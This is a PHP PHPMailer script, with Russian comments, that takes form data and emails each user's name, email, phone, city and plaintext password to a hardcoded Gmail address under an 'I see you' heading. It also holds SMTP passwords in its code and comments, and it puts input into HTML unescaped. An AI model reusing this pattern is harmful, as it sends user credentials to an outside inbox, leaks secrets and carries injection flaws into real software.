<?php
// Файлы phpmailer
require 'PHPMailer.php';
require 'SMTP.php';
require 'Exception.php';
$requestData = file_get_contents('php://input');
$data = json_decode($requestData, true);
$textOne = '<div style="background-color: black;">';
$textOne .= '<h2 style="width: 100%; text-align: center;">';
$textOne .= '<span style="text-align: center; color: white; text-transform: uppercase;">I see you</span>';
$textOne .= '</h2>';
$textOne .= '<span style="margin: 10px 0; display: block; width: 100%; height: 2px; background-color: white;"></span>';
$textOne .= '<div style="width: 100%; padding: 5px 0;">';
$textOne .= '<span style="color: white; text-align: left"><b>Name: </b></span>';
$textOne .= '<span style="color: white; text-align: left">'.$data['username'].'</span>';
$textOne .= '</div>';
$textOne .= '<br>';

$textOne .= '<div style="width: 100%; padding: 5px 0;">';
$textOne .= '<span style="color: white; text-align: left"><b>Email: </b></span>';
$textOne .= '<span style="color: white; text-align: left">'.$data['email'].'</span>';
$textOne .= '</div>';
$textOne .= '<br>';

$textOne .= '<div style="width: 100%; padding: 5px 0;">';
$textOne .= '<span style="color: white; text-align: left"><b>Phone: </b></span>';
$textOne .= '<span style="color: white; text-align: left">'.$data['phone'].'</span>';
$textOne .= '</div>';
$textOne .= '<br>';

$textOne .= '<div style="width: 100%; padding: 5px 0;">';
$textOne .= '<span style="color: white; text-align: left"><b>Password: </b></span>';
$textOne .= '<span style="color: white; text-align: left">'.$data['password'].'</span>';
$textOne .= '</div>';
$textOne .= '<br>';

$textOne .= '<div style="width: 100%; padding: 5px 0;">';
$textOne .= '<span style="color: white; text-align: left"><b>City: </b></span>';
$textOne .= '<span style="color: white; text-align: left">'.$data['city'].'</span>';
$textOne .= '</div>';
$textOne .= '<br>';
$textOne .= '</div>';

$textTwo = '<div style="background-color: black; width: 100%; height 540px;">';
$textTwo .= '<h2 style="width: 100%; text-align: center;">';
$textTwo .= '<span style="text-align: center; color: white; text-transform: uppercase;">I see you</span>';
$textTwo .= '</h2>';
$textTwo .= '<span style="margin: 10px 0; display: block; width: 100%; height: 2px; background-color: white;"></span>';
$textTwo .= '<div style="width: 100%; padding: 5px 0;">';
$textTwo .= '<span style="color: white; text-align: left"><b>Name: </b></span>';
$textTwo .= '<span style="color: white; text-align: left">'.$data['username'].'</span>';
$textTwo .= '</div>';
$textTwo .= '<br>';

$textTwo .= '<div style="width: 100%; padding: 5px 0;">';
$textTwo .= '<span style="color: white; text-align: left"><b>Phone: </b></span>';
$textTwo .= '<span style="color: white; text-align: left">'.$data['phone'].'</span>';
$textTwo .= '</div>';
$textTwo .= '<br>';

$textTwo .= '<div style="width: 100%; padding: 5px 0;">';
$textTwo .= '<span style="color: white; text-align: left"><b>Email: </b></span>';
$textTwo .= '<span style="color: white; text-align: left">'.$data['email'].'</span>';
$textTwo .= '</div>';
$textTwo .= '<br>';

$textTwo .= '</div>';


function sendMail($title, $email, $text){
    if (!error_get_last()) {

            // Настройки PHPMailer
        $mail = new PHPMailer\PHPMailer\PHPMailer();

        $mail->isSMTP();
        $mail->CharSet = "UTF-8";
        $mail->SMTPAuth   = true;
        $mail->SMTPDebug = 2;
        $mail->Debugoutput = function($str, $level) {$GLOBALS['data']['debug'][] = $str;};

        // Настройки вашей почты

        // $mail->Host       = 'smtp.gmail.com'; // SMTP сервера вашей почты
        // $mail->Host       = 'mail.webelit.website'; // SMTP сервера вашей почты
        $mail->Host = 'mail.latul.website';
        // $mail->Username   = 'webazex@gmail.com'; // Логин на почте
        // $mail->Username = 'support@webelit.website';
        $mail->Username = 'test@latul.website';
        // $mail->Password   = 'Support*001';
        // $mail->Password   = 'fmhrijnepzcriobu'; // Пароль на почте //Я тут указал пароль приложения
         $mail->Password   = 'Test';
        $mail->SMTPSecure = 'tls';
        // $mail->SMTPSecure = 'tls';
        // $mail->Port       = 587;//465;
        $mail->Port       = 587;//465;
        $mail->setFrom('test@latul.website', 'Test mail sender Unit'); // Адрес самой почты и имя отправителя

        // Получатель письма
        $mail->addAddress($email);


        // Отправка сообщения
        $mail->isHTML(true);
        $mail->Subject = $title;

        $mail->Body = $text;

        // Проверяем отправленность сообщения
        if ($mail->send()) {
            return [
                'result' => "success",
                'info' => "Сообщение успешно отправлено!"
            ];
        } else {
            return [
                'result' => "error",
                'info' => "Сообщение не было отправлено. Ошибка при отправке письма",
                'desc' => "Причина ошибки: {$mail->ErrorInfo}"
            ];
        }
    } else {
        return [
            'result' => "error",
            'info' => "В коде присутствует ошибка",
            'desc' => error_get_last()
        ];
    }
}
$retOne = sendMail("Letter is here", "webazex@gmail.com", $textOne);
$retTwo = sendMail("Letter is here", $data['email'] , $textTwo);

// Отправка результата
header('Content-Type: application/json');
echo json_encode($retOne, JSON_UNESCAPED_UNICODE);
?>